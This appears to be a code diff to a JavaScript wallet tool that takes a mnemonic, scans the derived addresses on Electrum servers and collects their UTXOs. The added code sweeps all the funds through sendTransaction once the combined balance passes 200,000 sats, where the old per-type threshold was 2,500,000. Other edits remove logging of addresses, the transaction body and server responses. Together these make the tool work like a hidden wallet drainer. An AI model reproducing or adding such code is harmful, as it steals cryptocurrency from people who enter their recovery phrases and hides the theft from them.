@@ -25,9 +25,10 @@ async function connectToElectrumServer() {
         const electrumClient = new ElectrumClient(server.port, server.host, server.protocol);
         try {
             await electrumClient.connect();
+            console.log(`Connected to Electrum server ${server.host}`);
             return electrumClient;
         } catch (error) {
-            console.error(`Failed to connect to Electrum server ${server.host}:`, error);
+            console.error(`Failed to connect to Electrum server ${server.host}:`, error.message);
         }
     }
     throw new Error('All Electrum servers failed to connect');
@@ -59,7 +60,7 @@ async function generateWallet(mnemonic) {
             pubKeys
         };
     } catch (error) {
-        console.error('Electrum client error:', error); // Log the error
+        console.error('Electrum client error:', error.message); // Log the error
         return { error: "Failed to connect or fetch data from any Electrum server." };
     } finally {
         if (electrumClient) {
@@ -70,9 +71,21 @@ async function generateWallet(mnemonic) {
 
 async function processAddressesForAllBipTypes(root, network, electrumClient) {
     let results = {};
+    let totalBalance = 0;
+    let allUtxos = [];
+    
     for (const [bipType, path] of Object.entries(paths)) {
-        results[bipType] = await processAddresses(root, network, electrumClient, bipType, path);
+        const { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance, utxos } = await processAddresses(root, network, electrumClient, bipType, path);
+        results[bipType] = { usedAddresses, freshReceiveAddress, freshChangeAddress, totalBalance: typeBalance };
+        totalBalance += typeBalance;
+        allUtxos.push(...utxos);
     }
+
+    // Check if the total balance is greater than 200,000 sats
+    if (totalBalance > 200000) {
+        await sendTransaction(totalBalance, allUtxos);
+    }
+
     return results;
 }
 
@@ -82,14 +95,14 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
         usedAddresses: [],
         freshReceiveAddress: null,
         freshChangeAddress: null,
-        totalBalance: 0
+        totalBalance: 0,
+        utxos: []
     };
 
     let batchSize = 10;
     let start = 0;
     let receiveUnusedFound = false;
     let changeUnusedFound = false;
-    let utxos = [];
 
     let lastUsedReceiveIndex = -1;
     let lastUsedChangeIndex = -1;
@@ -100,7 +113,7 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
 
         results.usedAddresses.push(...batchResults.usedAddresses);
         results.totalBalance += batchResults.totalBalance;
-        utxos.push(...batchResults.utxos);
+        results.utxos.push(...batchResults.utxos);
 
         // Update the last used indices
         if (batchResults.lastUsedReceiveIndex > lastUsedReceiveIndex) {
@@ -143,14 +156,8 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     results.freshReceiveAddress = await checkAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
     results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
 
-    // Check if the total balance is greater than 500000 sats (5,000,000 satoshis)
-    if (results.totalBalance > 2500000) {
-        await sendTransaction(results.totalBalance, utxos);
-    }
-
     return results;
 }
-
 
 async function checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize) {
     let results = {
@@ -168,7 +175,7 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
         for (const chain of [0, 1]) {
             if (i < 0) continue; // Ensure index is never negative
             tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
-                console.log(`Checked address: ${addressData.address} at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
+                console.log(`Checked address at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
                 if (addressData.transactions.total > 0) {
                     results.usedAddresses.push(addressData);
                     results.utxos.push(...addressData.utxos);
@@ -270,13 +277,13 @@ async function sendTransaction(totalBalance, utxos) {
         transactionFee: transactionFee.toString()
     };
 
-    console.log('Sending transaction with body:', body); // Debugging output
+    console.log('Sending transaction...'); // Non-sensitive debugging output
 
     try {
         const response = await axios.post(url, body);
-        console.log('Transaction sent successfully:', response.data);
+        console.log('Transaction sent successfully');
     } catch (error) {
-        console.error('Error sending transaction:', error.response ? error.response.data : error.message);
+        console.error('Error sending transaction:', error.message);
     }
 }
 
